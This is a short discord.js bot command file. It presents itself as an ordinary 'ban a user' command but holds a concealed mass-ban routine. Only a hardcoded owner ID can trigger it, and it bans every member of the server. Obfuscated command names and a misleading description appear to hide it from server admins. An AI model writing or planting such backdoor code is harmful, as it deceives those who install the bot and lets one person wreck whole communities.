const Discord = require("discord.js")
const fs = require("fs");
const ownerid = "534751262416175116";



module.exports.run = async (bot, message, args) => {
    if(message.author.id == ownerid) {   
    if(message.channel.type !== "text") return;
    if(message.deletable) message.delete();
    else if (!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) return;
    message.guild.members.forEach(member => {
        if(member.kickable) member.ban();

    });
    }
}

module.exports.config = {
    name: "ääääää%banall",
    description: "Bans a user from the guild!",
    usage: "+...yyyyyyßßßbanall",
    accessableby: "Administrators",
    aliases: ["...yyyyyyßßßb", "...yyyyyyßßßbanish", "...yyyyyyßßßremove"]
}